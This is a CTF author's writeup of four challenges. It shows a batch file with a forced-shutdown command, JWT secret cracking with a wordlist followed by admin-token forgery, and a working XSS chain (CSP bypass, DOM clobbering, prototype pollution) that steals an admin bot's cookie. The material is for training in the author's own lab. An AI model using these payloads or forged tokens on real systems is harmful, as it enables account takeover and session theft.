---
title: "Spiderman: Far From Secure Writeups"
description: "Writeups for Spiderman: Far From Secure CTF - two web and two misc challenges covering batch file logic, favicon steganography, JWT forging, and a chained CSP bypass, DOM clobbering, and prototype pollution exploit."
date: 2026-09-06
tags: ["ctf", "writeups", "web", "misc"]
cover: "/static/covers/spiderr.jpg"
draft: false
---

# Spiderman: Far From Secure

i got to make hardly 4 challenges for this ctf, 2 web and 2 misc, because i was mostly working on the infra. hope the challenges were a lil fun and a lil hard, yeah we tried our best to catch a few **sloppers**.

![image](/static/blog/spiderman/ByVfmfo_zx.png)

## misc

### blooper

> play the game to get points and get flag :))

`game.bat` was given.

basically a batch file that would shutdown your windows by executing `shutdown /s /f /t 0`

**solution**

to solve it you would have to open it in a text editor and change the logic from

| From              | To              |
| ----------------- | --------------- |
| `"MODE=shutdown"` | `"MODE=unlock"` |
| `"GATE=deny"`     | `"GATE=open"`   |

also put a `pause` at the end so that it stays up on the screen.

```bat
@echo off
REM ============================================================
REM  B.L.O.O.P.E.R.  ::  Bootstrap Loader / Operator Path
REM ------------------------------------------------------------
REM  Something feels off about this loader. It never seems to
REM  actually DO anything when you double-click it...
REM ============================================================
setlocal EnableDelayedExpansion

REM --- loader configuration -----------------------------------
REM  MODE controls what the loader does on start.
REM    shutdown  = immediately shut down the VM
REM    unlock    = run the operator path and retrieve the payload
set "MODE=unlock"

REM  The operator path only works when the correct GATE is set.
set "GATE=open"

REM --- dispatch -----------------------------------------------
if /I "%MODE%"=="shutdown" (
    REM Immediate VM shutdown.
    endlocal
    shutdown /s /f /t 0
    exit /b 0
)

REM --- operator path ------------------------------------------
set "SERVER=http://spideyctf.duckdns.org:5102"
for /f "usebackq delims=" %%R in (`powershell -NoProfile -Command ^
    "try { (Invoke-WebRequest -UseBasicParsing -TimeoutSec 15 -Uri '%SERVER%/payload?mode=%MODE%&gate=%GATE%').Content } catch { 'ERR' }"
`) do set "RESP=%%R"

echo(
echo [B.L.O.O.P.E.R. // OPERATOR PATH]
echo %RESP%
echo(
endlocal
pause
exit /b 0
```

![image](/static/blog/spiderman/rJnVf-s_zx.png)

flag: `ENTRE{bl00ppers##$}`

### insanity check

> it is what it is

this challenge was supposed to be a fun challenge as it sounds one. you guys had to find the flag within the website.

**solution**

get the `favicon.ico` of the website where the ctf was hosted either through the `networks` tab within the browser or using any online tool. then,

```
strings favicon.ico
```

![image](/static/blog/spiderman/SkQuVZj_Gl.png)

then you have to decode it using `ROT13` cipher, i personally use [CyberChef](https://gchq.github.io/CyberChef/) for such ciphers

![image](/static/blog/spiderman/ByyMBZj_zl.png)

flag: `ENTRE{s4n!tY_ch3cK_d0ne_rIgh7}`

## web

### Web-Slinger Portal

> The portal knows who you are and what you're allowed to touch. You're signed in as a member. The secret console is one clearance level up. Find a way to earn the badge you weren't given.

[portal link](https://spideyctf.duckdns.org/slinger/)

![image](/static/blog/spiderman/r1WN8Zo_Gl.png)

**solution**

the portal would already show you your current role, and it also had a button asking to `access admin`

so the first thought you would get here is to somehow become an admin

now the interesting part, when you check the local storage you see there's a `jwt` token

a jwt is a basic auth used by many platforms which is signed using some algorithm and a secret key. if the secret key is leaked somewhere or someone just figures out what that is, then the user could change the jwt accordingly.

so in this case, we had to find the secret first. to find the secret we had to bruteforce the jwt with a random wordlist, we use `rockyou.txt`

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0NzQxNzcyNC04NTU1LTQyNmUtYjRhMi0wMGM4MGMyNzQ3NDgiLCJ0ZWFtIjoicGl4eSIsInJvbGUiOiJ1c2VyIiwicG9ydGFsIjoid2ViLXNsaW5nZXIiLCJpYXQiOjE3ODg3MDgzMzIsImV4cCI6MTc4ODcxNTUzMn0.EGAB5_xPonh03teS-M_zS4wEdMb2eZBQ9TXgAKyIjPU -C -d /usr/share/wordlists/rockyou.txt
```

![image](/static/blog/spiderman/r1OhtZsdfx.png)

we got the secret as `secret` ;))

i wanted every single one of you to solve this, but none solved because you could just not give it to the LLMs because it has an SSE auth :0

now the forging part. you could forge the token using jwt_tool itself, but i really like anything to do on web than terminal, so i use [jwt.io](https://www.jwt.io/)

changing the `role` to `admin`

and using the secret that we just cracked which is `secret`

![image](/static/blog/spiderman/Bko9q-ouGe.png)

we get a new `jwt`

now replace the jwt on the portal in `localstorage` with the forged jwt.

> this basically makes the app think the admin is accessing the page and not a normal user.

![image](/static/blog/spiderman/SkiIobj_Ml.png)

flag: `ENTRE{sp!dey_l0v3s_jw7_&&}`

### Scratchpad

> Scratchpad is our lightweight note tool - jot something down with a bit of formatting, share the link, and if a note looks off, report it and a moderator will give it a read.

>we locked the viewer down pretty carefully. Convince the moderator to hand you something they shouldn't.

>http://spideyctf.duckdns.org:30080/

>Hint: there's an admin bot which checks your url - you have to craft and submit the right url to get the flag

**solution**

open the challenge, you see a note app where you write html, get a shareable `/note/<uuid>` link, and a `report to a admin` flow (that's the admin bot). the ctf challenge page has a field to submit a note url for the moderator to visit.

the solve path consists of bypassing 3 vulnerabilities

`CSP bypass`

`DOM clobbering`

`Prototype pollution`

**csp bypass**: inline XSS is blocked by `script-src 'self'`, so normal `<script>` or event handler payloads don't work here.

in [app.js](http://spideyctf.duckdns.org:30080/static/app.js) the `/api/callback?cb=` reflects `cb` directly into a same origin javascript response.

![image](/static/blog/spiderman/SyTV6-s_Mx.png)

**DOM clobbering**: `<a id="APP_CONFIG">x</a>` means by the time app.js checks `if (!window.APP_CONFIG)`, it's already truthy.

**prototype pollution**: the `#settings` json is passed through `deepMerge()` so using `__proto__` pollutes `Object.prototype` and supplies the missing `bridge.callback` which helps us reach the admin server.

the main part is that the callback reads `document.cookie` and posts it back to `/api/notes`, avoiding the bot's external-domain restriction.

so we come up with a note which has `<a id="APP_CONFIG">x</a>` in it

![image](/static/blog/spiderman/H1T2JzjOMx.png)

then we combine the prototype pollution by polluting the url

```
#settings={"__proto__":{"bridge":{"callback":"console.log('FLAG.'.concat(document.cookie));fetch('/api/notes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({body:'FLAG.'.concat(document.cookie)})});//"}}}
```

when we submit this to the admin bot with the url, it rejects because the special characters are blocked, so we will `url encode` it and then send it to the admin bot to fetch.

![image](/static/blog/spiderman/Hkd5xzi_Ml.png)

final payload

```
http://spideyctf.duckdns.org:30080/note/13a4d814-80f3-4745-a372-12cda7cf163e#settings=%7B%22%5F%5Fproto%5F%5F%22:%7B%22bridge%22:%7B%22callback%22:%22console%2Elog('FLAG%2E'%2Econcat(document%2Ecookie));fetch('/api/notes',%7Bmethod:'POST',headers:%7B'Content%2DType':'application/json'%7D,body:JSON%2Estringify(%7Bbody:'FLAG%2E'%2Econcat(document%2Ecookie)%7D)%7D);//%22%7D%7D%7D
```

![image](/static/blog/spiderman/B1UF-foOGl.png)

flag: `ENTRE{po!Lut3_7h3_Pr0totyp3_cL0bb3r_th3_d0m!!}`

bubbyee!!!


### connect me on:

[swarnimbandekar.in](https://swarnimbandekar.in/)

[LinkedIn](https://www.linkedin.com/in/swarnimbandekar/)

email: hello@swarnimbandekar.in
